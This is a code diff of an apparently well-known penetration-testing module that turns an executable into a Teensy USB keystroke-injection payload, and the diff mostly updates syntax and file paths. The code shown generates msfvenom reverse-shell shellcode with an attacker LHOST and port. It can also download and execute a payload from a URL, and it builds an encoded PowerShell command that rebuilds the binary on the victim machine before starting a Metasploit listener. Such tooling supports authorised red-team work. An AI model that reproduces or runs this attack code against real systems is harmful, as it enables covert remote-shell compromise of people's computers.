@@ -17,14 +17,10 @@ from src.core.menu.text import *
 ################################################################################################
 
 #
-# grab the interface ip address
-#
-ipaddr = grab_ipaddress()
-
-#
 # metasploit_path here
 #
 msf_path = meta_path() + "msfconsole"
+if msf_path == "msfconsole": msf_path = "/usr/bin/msfconsole"
 
 ################################################################
 #
@@ -56,7 +52,7 @@ print """
         BSIDES Las Vegas ----  EXE to Teensy Creator
 ********************************************************************
 
-Written by: Josh Kelley (@winfang98) and Dave Kennedy (ReL1K, @hackingdave)
+Written by: Josh Kelley (@winfang98) and Dave Kennedy (ReL1K, @HackingDave)
 
 This program will take shellexeccode which is converted to hexadecimal and
 place it onto a victim machine through hex to binary conversion via powershell.
@@ -91,6 +87,12 @@ if payload == "windows/download_exec":
     url = raw_input(setprompt(["6"], "The URL with the payload to download and execute"))
     url = "set URL " + url
 
+#
+# grab the interface ip address
+#
+ipaddr = grab_ipaddress()
+
+
 # try except for Keyboard Interrupts
 try:
     # grab port number
@@ -110,7 +112,7 @@ try:
 
         # if we bomb out then loop through again
         except:
-            print "   [!] Not a valid port number, try again."
+            print_error("[!] Not a valid port number, try again.")
             # pass through
             pass
 
@@ -124,7 +126,7 @@ except KeyboardInterrupt:
 
     sys.exit("\n[!] Control-C detected. Bombing out. Later Gangster...\n\n")
 
-print "   [*] Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim..."
+print_status("Generating alpha_mixed shellcode to be injected after shellexec has been deployed on victim...")
 # grab msfvenom alphanumeric shellcode to be inserted into shellexec
 proc = subprocess.Popen("%smsfvenom -p %s EXITFUNC=thread LHOST=%s LPORT=%s %s --format raw -e x86/alpha_mixed BufferRegister=EAX" % (meta_path(),payload,ipaddr,port,url), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 # read in stdout which will be our alphanumeric shellcode
@@ -139,14 +141,14 @@ filewrite.write(shell_exec)
 filewrite.close()
 # open up the random file
 fileopen=file(random_filename, "r")
-# base counter will be used for the prog_char RevShell_counter
+# base counter will be used for the const char RevShell_counter
 counter = 0
-# space to write out per line in the teensy pde file
+# space to write out per line in the teensy ino file
 space = 50
 # rev counter is used for the second writeout
 rev_counter = 0
 # here we begin the code
-output_variable = "/* Teensy Hex to File Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K)*/\n#include <avr/pgmspace.h>\n"
+output_variable = "/* Teensy Hex to File Created by Josh Kelley (winfang) and Dave Kennedy (ReL1K) - file ext changed to .ino and prog_char & PROGMEM modified */\n#include <avr/pgmspace.h>\n"
 
 # powershell command here, needs to be unicoded then base64 in order to use encodedcommand
 powershell_command = unicode("$s=gc \"$HOME\\AppData\\Local\\Temp\\%s\";$s=[string]::Join('',$s);$s=$s.Replace('`r',''); $s=$s.Replace('`n','');$b=new-object byte[] $($s.Length/2);0..$($b.Length-1)|%%{$b[$_]=[Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes(\"$HOME\\AppData\\Local\\Temp\\%s.exe\",$b)" % (random_filename,random_filename))
@@ -177,12 +179,12 @@ while 1:
     # if its blank then break out of loop
     if reading_hex == "": break
     # write out counter and hex
-    output_variable += 'prog_char RevShell_%s[] PROGMEM = "%s";\n' % (counter,reading_hex)
+    output_variable += 'const char RevShell_%s[] = "%s";\n' % (counter,reading_hex)
     # increase counter
     counter = counter +1
 
 # write out the rest
-output_variable += "PROGMEM const char *exploit[] = {\n"
+output_variable += "const char *exploit[] = {\n"
 # while rev_counter doesn't equal regular counter
 while rev_counter != counter:
     output_variable+="RevShell_%s" % rev_counter
@@ -306,22 +308,24 @@ Keyboard.send_now();
 }""" % (random_filename,random_filename,powershell_command,vbs,bat,vbs,vbs,random_filename,alpha_payload,bat,vbs))
 # delete temporary file
 subprocess.Popen("rm %s 1> /dev/null 2>/dev/null" % (random_filename), shell=True).wait()
-print "   [*] Binary to Teensy file exported as %s/reports/binary2teensy.pde" % (setdir)
-# write the teensy.pde file out
-filewrite = file(setdir + "/reports/binary2teensy.pde", "w")
-# write the teensy.pde file out
+if not os.path.isdir(userconfigpath + "reports"): os.makedirs(userconfigpath + "reports")
+print_status("Binary to Teensy file exported as %sreports/binary2teensy" % (userconfigpath))
+# write the teensy.ino file out
+filewrite = file(userconfigpath + "reports/binary2teensy.ino", "w")
+# write the teensy.ino file out
 filewrite.write(output_variable)
 # close the file
 filewrite.close()
-print "   [*] Generating a listener..."
+print_status("Generating a listener...")
 # create our metasploit answer file
-filewrite = file(setdir + "/answer.txt", "w")
+filewrite = file(userconfigpath + "answer.txt", "w")
 filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\n%s\nexploit -j" % (payload,ipaddr,port,url))
 filewrite.close()
 # spawn a multi/handler listener
-subprocess.Popen("msfconsole -r %s/answer.txt" % (setdir), shell=True).wait()
-print "   [*] Housekeeping old files..."
+subprocess.Popen("msfconsole -r %sanswer.txt" % (userconfigpath), shell=True).wait()
+print_status("[*] Housekeeping old files...")
 # if our answer file is still there (which it should be), then remove it
-if os.path.isfile(setdir + "/answer.txt"):
+if os.path.isfile(userconfigpath + "answer.txt"):
     # remove the old file, no longer used once we've exited
-    subprocess.Popen(setdir + "/answer.txt", shell=True).wait()
+    subprocess.Popen("rm " + userconfigpath + "answer.txt", shell=True).wait()
+
